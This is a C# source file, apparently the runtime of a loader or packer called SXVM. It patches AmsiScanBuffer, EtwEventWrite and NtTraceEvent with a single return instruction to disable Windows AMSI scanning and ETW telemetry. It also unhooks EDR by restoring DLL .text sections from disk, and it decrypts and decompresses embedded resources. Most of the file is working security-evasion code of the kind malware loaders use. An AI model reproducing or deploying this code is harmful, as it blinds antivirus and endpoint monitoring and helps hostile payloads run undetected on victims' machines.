using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static SXVM.Settings;
using System.Net;
using System.Text.RegularExpressions;

namespace SXVM
{
    internal static class API
    {
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, long dwSize, out long lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out long lpNumberOfBytesWritten);

        private static Dictionary<string, Func<object[], object[]>> labelActions = new Dictionary<string, Func<object[], object[]>>();

        internal static void RegisterHandler(string label, Func<object[], object[]> action)
        {
            labelActions[label] = action;
        }

        internal static object[] JMP(string label, object[] args = null, bool Return = false)
        {
            if (labelActions.ContainsKey(label))
            {
                object[] result = labelActions[label].Invoke(args);
                if (!Return)
                {
                    result = null;
                    goto JMPOut;
                }
                return result;
            }
            else
            {
                throw new AccessViolationException();
                return null;
            }

        JMPOut:
            throw new AccessViolationException();
            return null;
        }

        internal static void ClearDecryptionKeyFromMemory()
        {
            DecryptionKey = @"";
            DecryptionKey = null;
            GC.Collect();
        }

        internal static unsafe IntPtr GetManagedFunctionPointer(void* managedPointer)
        {
            long* longAddress = (long*)managedPointer + 1;
            byte* targetAddress = (byte*)*longAddress;
            return (IntPtr)targetAddress;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [HandleProcessCorruptedStateExceptions]
        private static IntPtr FindBytes(IntPtr startAddress, uint size, byte[] pattern)
        {
            try
            {
                for (long i = 0; i < size - pattern.Length; i++)
                {
                    bool found = true;
                    for (int j = 0; j < pattern.Length; j++)
                    {
                        if (Marshal.ReadByte((IntPtr)((long)startAddress + i + j)) != pattern[j])
                        {
                            found = false;
                            break;
                        }
                    }

                    if (found)
                    {
                        return (IntPtr)((long)startAddress + i);
                    }
                }

                return IntPtr.Zero;
            }
            catch
            {
                return IntPtr.Zero;
            }
        }

        internal static IntPtr FindECallFunction(string moduleName, string functionName)
        {
            IntPtr hModule = GetModuleHandle(moduleName);
            if (hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr pFuncName = FindBytes(hModule, uint.MaxValue, System.Text.Encoding.ASCII.GetBytes(functionName + "\0"));
            if (pFuncName == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr ppFuncName = FindBytes(hModule, uint.MaxValue, BitConverter.GetBytes(pFuncName.ToInt64()));
            if (ppFuncName == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr funcAddr = Marshal.ReadIntPtr(ppFuncName - IntPtr.Size);
            if (funcAddr.ToInt64() < hModule.ToInt64() || funcAddr.ToInt64() >= hModule.ToInt64() + (long)uint.MaxValue)
            {
                return IntPtr.Zero;
            }

            return funcAddr;
        }

        internal static IntPtr FindECallFunctionViaModule(IntPtr hModule, string functionName)
        {
            if (hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr pFuncName = FindBytes(hModule, uint.MaxValue, System.Text.Encoding.ASCII.GetBytes(functionName + "\0"));
            if (pFuncName == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr ppFuncName = FindBytes(hModule, uint.MaxValue, BitConverter.GetBytes(pFuncName.ToInt64()));
            if (ppFuncName == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            IntPtr funcAddr = Marshal.ReadIntPtr(ppFuncName - IntPtr.Size);
            if (funcAddr.ToInt64() < hModule.ToInt64() || funcAddr.ToInt64() >= hModule.ToInt64() + (long)uint.MaxValue)
            {
                return IntPtr.Zero;
            }

            return funcAddr;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            public ushort e_res_0;
            public ushort e_res_1;
            public ushort e_res_2;
            public ushort e_res_3;
            public ushort e_oemid;
            public ushort e_oeminfo;
            public ushort e_res2_0;
            public ushort e_res2_1;
            public ushort e_res2_2;
            public ushort e_res2_3;
            public ushort e_res2_4;
            public ushort e_res2_5;
            public ushort e_res2_6;
            public ushort e_res2_7;
            public ushort e_res2_8;
            public ushort e_res2_9;
            public uint e_lfanew;
        }

        [HandleProcessCorruptedStateExceptions]
        internal static void WriteCustomHeader(ushort NewHeader, out ushort OldHeader)
        {
            try
            {
                IntPtr module = GetModuleHandle(null);
                if (module != IntPtr.Zero)
                {
                    IntPtr signaturePtr = IntPtr.Add(module, Marshal.SizeOf(typeof(IMAGE_DOS_HEADER)));
                    ushort signature = (ushort)Marshal.PtrToStructure(signaturePtr, typeof(ushort));
                    if (signature != NewHeader)
                    {
                        OldHeader = signature;
                        uint oldProtect;
                        if (VirtualProtect(module, (UIntPtr)512, 0x40, out oldProtect))
                        {
                            signature = NewHeader;
                            Marshal.StructureToPtr(signature, signaturePtr, false);
                            VirtualProtect(module, (UIntPtr)512, oldProtect, out oldProtect);
                        }
                    }
                    else
                    {
                        OldHeader = 0;
                    }
                }
                else
                {
                    OldHeader = 0;
                }
            }
            catch
            {
                OldHeader = 0;
            }
        }

        [HandleProcessCorruptedStateExceptions]
        private static ProcessModule GetModuleByAddress(IntPtr address)
        {
            try
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    try
                    {
                        IntPtr baseAddress = module.BaseAddress;

                        if (address.ToInt64() >= baseAddress.ToInt64() && address.ToInt64() < baseAddress.ToInt64() + module.ModuleMemorySize)
                        {
                            return module;
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }

            return null;
        }

        [HandleProcessCorruptedStateExceptions]
        internal static IntPtr SearchAoB(string pattern, string ModuleName)
        {
            try
            {
                Process process = Process.GetCurrentProcess();

                foreach (ProcessModule module in process.Modules)
                {
                    if (module.ModuleName == ModuleName)
                    {
                        IntPtr baseAddress = module.BaseAddress;

                        byte?[] patternBytes = pattern.Split(' ').Select(x =>
                        {
                            if (x == "??")
                            {
                                return null;
                            }
                            return (byte?)Convert.ToByte(x, 16);
                        }).ToArray();

                        byte[] memoryBytes = new byte[module.ModuleMemorySize];

                        long bytesRead;
                        if (ReadProcessMemory(process.Handle, baseAddress, memoryBytes, memoryBytes.LongLength, out bytesRead) && bytesRead == memoryBytes.Length)
                        {
                            for (long i = 0; i <= memoryBytes.Length - patternBytes.Length; i++)
                            {
                                bool found = true;
                                for (long j = 0; j < patternBytes.Length; j++)
                                {
                                    if (patternBytes[j].HasValue && patternBytes[j] != memoryBytes[i + j])
                                    {
                                        found = false;
                                        break;
                                    }
                                }

                                if (found)
                                {
                                    IntPtr AOB_Address = (IntPtr)(baseAddress.ToInt64() + i);
                                    if (GetModuleByAddress(AOB_Address).ModuleName == ModuleName)
                                    {
                                        return AOB_Address;
                                    }
                                }
                            }
                        }
                        break;
                    }
                }
            }
            catch
            {
            }

            return IntPtr.Zero;
        }

        [HandleProcessCorruptedStateExceptions]
        internal static unsafe void WriteMemoryBlock(IntPtr Address, byte[] src, uint size)
        {
            if ((int)size > src.Length)
            {
                throw new ArgumentOutOfRangeException(nameof(size), "Size exceeds the length of the source array.");
            }
            else
            {
                uint OldProtect;
                VirtualProtect(Address, (UIntPtr)size, 0x40, out OldProtect);
                try
                {
                    void* dest = (void*)Address;
                    for (int i = 0; i < (int)size; i++)
                    {
                        *((byte*)dest + i) = src[i];
                    }
                    GC.Collect();
                    VirtualProtect(Address, (UIntPtr)size, OldProtect, out uint _);
                }
                catch
                {
                    VirtualProtect(Address, (UIntPtr)size, OldProtect, out uint _);
                    throw new AccessViolationException();
                }
            }
        }

        [HandleProcessCorruptedStateExceptions]
        internal static unsafe byte[] ReadMemoryBlock(IntPtr Address, uint size)
        {
            if (Address == IntPtr.Zero)
            {
                throw new ArgumentException("Invalid memory address.");
                return null;
            }
            else if ((int)size <= 0)
            {
                throw new ArgumentException("Size must be greater than zero.");
                return null;
            }
            else
            {
                uint OldProtect;
                VirtualProtect(Address, (UIntPtr)size, 0x40, out OldProtect);
                try
                {
                    byte[] result = new byte[(int)size];
                    void* src = (void*)Address;
                    for (int i = 0; i < (int)size; i++)
                    {
                        result[i] = *((byte*)src + i);
                    }
                    VirtualProtect(Address, (UIntPtr)size, OldProtect, out uint _);
                    return result;
                }
                catch
                {
                    VirtualProtect(Address, (UIntPtr)size, OldProtect, out uint _);
                    throw new AccessViolationException();
                }
                return null;
            }
            return null;
        }

        private static byte[] Original_AmsiScanBuffer = null;
        private static byte[] Original_EtwEventWrite = null;
        private static byte[] Original_NtTraceEvent = null;

        [HandleProcessCorruptedStateExceptions]
        internal static void PatchEDR(bool Patch_AMSI, bool Patch_ETW, bool UseWriteProcessMemory)
        {
            try
            {
                IntPtr AMSI_Library = LoadLibrary(@"amsi.dll");
                IntPtr NTDLL_Library = LoadLibrary(@"ntdll.dll");
                IntPtr AmsiScanBuffer_Address = GetProcAddress(AMSI_Library, @"AmsiScanBuffer");
                IntPtr EtwEventWrite_Address = GetProcAddress(NTDLL_Library, @"EtwEventWrite");
                IntPtr NtTraceEvent_Address = GetProcAddress(NTDLL_Library, @"NtTraceEvent");
                Original_AmsiScanBuffer = ReadMemoryBlock(AmsiScanBuffer_Address, 30);
                Original_EtwEventWrite = ReadMemoryBlock(EtwEventWrite_Address, 30);
                Original_NtTraceEvent = ReadMemoryBlock(NtTraceEvent_Address, 30);
                byte[] Patch = { 0xC3 };
                if (Patch_AMSI == true)
                {
                    if (UseWriteProcessMemory == true)
                    {
                        WriteProcessMemory(Process.GetCurrentProcess().Handle, AmsiScanBuffer_Address, Patch, (uint)Patch.Length, out _);
                    }
                    else
                    {
                        WriteMemoryBlock(AmsiScanBuffer_Address, Patch, (uint)Patch.Length);
                    }
                }
                else
                {
                }
                if (Patch_ETW == true)
                {
                    if (UseWriteProcessMemory == true)
                    {
                        WriteProcessMemory(Process.GetCurrentProcess().Handle, EtwEventWrite_Address, Patch, (uint)Patch.Length, out _);
                        WriteProcessMemory(Process.GetCurrentProcess().Handle, NtTraceEvent_Address, Patch, (uint)Patch.Length, out _);
                    }
                    else
                    {
                        WriteMemoryBlock(EtwEventWrite_Address, Patch, (uint)Patch.Length);
                        WriteMemoryBlock(NtTraceEvent_Address, Patch, (uint)Patch.Length);
                    }
                }
            }
            catch
            {
            }
        }

        [HandleProcessCorruptedStateExceptions]
        internal static void RestorePatchIntegrity(bool UseWriteProcessMemory, bool Exit = true)
        {
            try
            {
                IntPtr AMSI_Library = LoadLibrary(@"amsi.dll");
                IntPtr NTDLL_Library = LoadLibrary(@"ntdll.dll");
                IntPtr AmsiScanBuffer_Address = GetProcAddress(AMSI_Library, @"AmsiScanBuffer");
                IntPtr EtwEventWrite_Address = GetProcAddress(NTDLL_Library, @"EtwEventWrite");
                IntPtr NtTraceEvent_Address = GetProcAddress(NTDLL_Library, @"NtTraceEvent");
                if (UseWriteProcessMemory == true)
                {
                    WriteProcessMemory(Process.GetCurrentProcess().Handle, AmsiScanBuffer_Address, Original_AmsiScanBuffer, (uint)Original_AmsiScanBuffer.Length, out _);
                    WriteProcessMemory(Process.GetCurrentProcess().Handle, EtwEventWrite_Address, Original_EtwEventWrite, (uint)Original_EtwEventWrite.Length, out _);
                    WriteProcessMemory(Process.GetCurrentProcess().Handle, NtTraceEvent_Address, Original_NtTraceEvent, (uint)Original_NtTraceEvent.Length, out _);
                }
                else
                {
                    WriteMemoryBlock(AmsiScanBuffer_Address, Original_AmsiScanBuffer, (uint)Original_AmsiScanBuffer.Length);
                    WriteMemoryBlock(EtwEventWrite_Address, Original_EtwEventWrite, (uint)Original_EtwEventWrite.Length);
                    WriteMemoryBlock(NtTraceEvent_Address, Original_NtTraceEvent, (uint)Original_NtTraceEvent.Length);
                }
                if (Exit == true)
                {
                    throw new AccessViolationException();
                }
                else
                {
                }
            }
            catch
            {
                if (Exit == true)
                {
                    throw new AccessViolationException();
                }
                else
                {
                }
            }
        }

        internal static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        internal static byte[] Decompress(byte[] data)
        {
            using (MemoryStream input = new MemoryStream(data))
            {
                using (MemoryStream output = new MemoryStream())
                {
                    using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
                    {
                        dstream.CopyTo(output);
                    }
                    return output.ToArray();
                }
            }
        }

        internal static byte[] AESDecrypt(byte[] input, string Pass)
        {
            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
            byte[] hash = new byte[32];
            byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);
            AES.Key = hash;
            AES.Mode = System.Security.Cryptography.CipherMode.ECB;
            System.Security.Cryptography.ICryptoTransform DESDecrypter = AES.CreateDecryptor();
            return DESDecrypter.TransformFinalBlock(input, 0, input.Length);
        }

        internal static class Unhooker
        {
            [HandleProcessCorruptedStateExceptions]
            internal static unsafe void Unhook(string a)
            {
                try
                {
                    bool wow64;
                    IsWow64Process(Process.GetCurrentProcess().Handle, out wow64);

                    string systemDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32\";
                    if (wow64 && IntPtr.Size == 4)
                    {
                        systemDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\SysWOW64\";
                    }

                    IntPtr dll = GetLoadedModuleAddress(a);
                    if (dll == IntPtr.Zero) return;
                    MODULEINFO moduleInfo;
                    if (!GetModuleInformation(Process.GetCurrentProcess().Handle, dll, out moduleInfo, (uint)sizeof(MODULEINFO))) return;

                    IntPtr dllFile = CreateFileA(systemDirectory + a, 0x80000000, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
                    if (dllFile == (IntPtr)(-1))
                    {
                        CloseHandle(dllFile);
                        return;
                    }

                    IntPtr dllMapping = CreateFileMapping(dllFile, IntPtr.Zero, 0x1000002, 0, 0, null);
                    if (dllMapping == IntPtr.Zero)
                    {
                        CloseHandle(dllMapping);
                        return;
                    }

                    IntPtr dllMappedFile = MapViewOfFile(dllMapping, 4, 0, 0, IntPtr.Zero);
                    if (dllMappedFile == IntPtr.Zero) return;

                    int ntHeaders = Marshal.ReadInt32((IntPtr)((long)moduleInfo.BaseOfDll + 0x3c));
                    short numberOfSections = Marshal.ReadInt16((IntPtr)((long)dll + ntHeaders + 0x6));
                    short sizeOfOptionalHeader = Marshal.ReadInt16(dll, ntHeaders + 0x14);

                    for (short i = 0; i < numberOfSections; i++)
                    {
                        IntPtr sectionHeader = (IntPtr)((long)dll + ntHeaders + 0x18 + sizeOfOptionalHeader + i * 0x28);
                        if (Marshal.ReadByte(sectionHeader) == '.' &&
                            Marshal.ReadByte((IntPtr)((long)sectionHeader + 1)) == 't' &&
                            Marshal.ReadByte((IntPtr)((long)sectionHeader + 2)) == 'e' &&
                            Marshal.ReadByte((IntPtr)((long)sectionHeader + 3)) == 'x' &&
                            Marshal.ReadByte((IntPtr)((long)sectionHeader + 4)) == 't')
                        {
                            int virtualAddress = Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0xc));
                            uint virtualSize = (uint)Marshal.ReadInt32((IntPtr)((long)sectionHeader + 0x8));
                            uint oldProtect;
                            VirtualProtectA((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, 0x40, out oldProtect);
                            memcpy((IntPtr)((long)dll + virtualAddress), (IntPtr)((long)dllMappedFile + virtualAddress), (IntPtr)virtualSize);
                            VirtualProtectA((IntPtr)((long)dll + virtualAddress), (IntPtr)virtualSize, oldProtect, out oldProtect);
                            break;
                        }
                    }

                    CloseHandle(dllMapping);
                    CloseHandle(dllFile);
                    FreeLibrary(dll);
                }
                catch
                {
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct MODULEINFO
            {
                public IntPtr BaseOfDll;
                public uint SizeOfImage;
                public IntPtr EntryPoint;
            }

            private static CloseHandleD CloseHandle = Marshal.GetDelegateForFunctionPointer<CloseHandleD>(GetLibraryAddress("kernel32.dll", "CloseHandle"));
            private static FreeLibraryD FreeLibrary = Marshal.GetDelegateForFunctionPointer<FreeLibraryD>(GetLibraryAddress("kernel32.dll", "FreeLibrary"));
            private static VirtualProtectD VirtualProtectA = Marshal.GetDelegateForFunctionPointer<VirtualProtectD>(GetLibraryAddress("kernel32.dll", "VirtualProtect"));
            private static CreateFileAD CreateFileA = Marshal.GetDelegateForFunctionPointer<CreateFileAD>(GetLibraryAddress("kernel32.dll", "CreateFileA"));
            private static CreateFileMappingD CreateFileMapping = Marshal.GetDelegateForFunctionPointer<CreateFileMappingD>(GetLibraryAddress("kernel32.dll", "CreateFileMappingA"));
            private static MapViewOfFileD MapViewOfFile = Marshal.GetDelegateForFunctionPointer<MapViewOfFileD>(GetLibraryAddress("kernel32.dll", "MapViewOfFile"));
            private static memcpyD memcpy = Marshal.GetDelegateForFunctionPointer<memcpyD>(GetLibraryAddress("msvcrt.dll", "memcpy"));
            private static GetModuleInformationD GetModuleInformation = Marshal.GetDelegateForFunctionPointer<GetModuleInformationD>(GetLibraryAddress("psapi.dll", "GetModuleInformation"));
            private static IsWow64ProcessD IsWow64Process = Marshal.GetDelegateForFunctionPointer<IsWow64ProcessD>(GetLibraryAddress("kernel32.dll", "IsWow64Process"));

            private delegate bool CloseHandleD(IntPtr handle);

            private delegate bool FreeLibraryD(IntPtr module);

            private delegate int VirtualProtectD(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);

            private delegate IntPtr CreateFileAD(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

            private delegate IntPtr CreateFileMappingD(IntPtr file, IntPtr fileMappingAttributes, uint protect, uint maximumSizeHigh, uint maximumSizeLow, string name);

            private delegate IntPtr MapViewOfFileD(IntPtr fileMappingObject, uint desiredAccess, uint fileOffsetHigh, uint fileOffsetLow, IntPtr numberOfBytesToMap);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            private delegate IntPtr memcpyD(IntPtr dest, IntPtr src, IntPtr count);

            private delegate bool GetModuleInformationD(IntPtr process, IntPtr module, out MODULEINFO moduleInfo, uint size);

            private delegate bool IsWow64ProcessD([In] IntPtr hProcess, [Out] out bool wow64Process);

            private static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
            {
                return GetExportAddress(GetLoadedModuleAddress(DLLName), FunctionName);
            }

            private static IntPtr GetLoadedModuleAddress(string DLLName)
            {
                ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
                foreach (ProcessModule Mod in ProcModules)
                {
                    if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                    {
                        return Mod.BaseAddress;
                    }
                }
                return IntPtr.Zero;
            }

            private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
            {
                IntPtr FunctionPtr = IntPtr.Zero;
                try
                {
                    Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                    Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                    Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                    Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                    Int64 pExport = 0;
                    if (Magic == 0x010b)
                    {
                        pExport = OptHeader + 0x60;
                    }
                    else
                    {
                        pExport = OptHeader + 0x70;
                    }

                    Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                    Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                    Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                    Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                    Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                    Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                    Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                    for (int i = 0; i < NumberOfNames; i++)
                    {
                        string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                        if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                        {
                            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                            FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                            break;
                        }
                    }
                }
                catch
                {
                    throw new InvalidOperationException();
                }

                if (FunctionPtr == IntPtr.Zero)
                {
                    throw new MissingMethodException();
                }
                return FunctionPtr;
            }
        }
    }
}
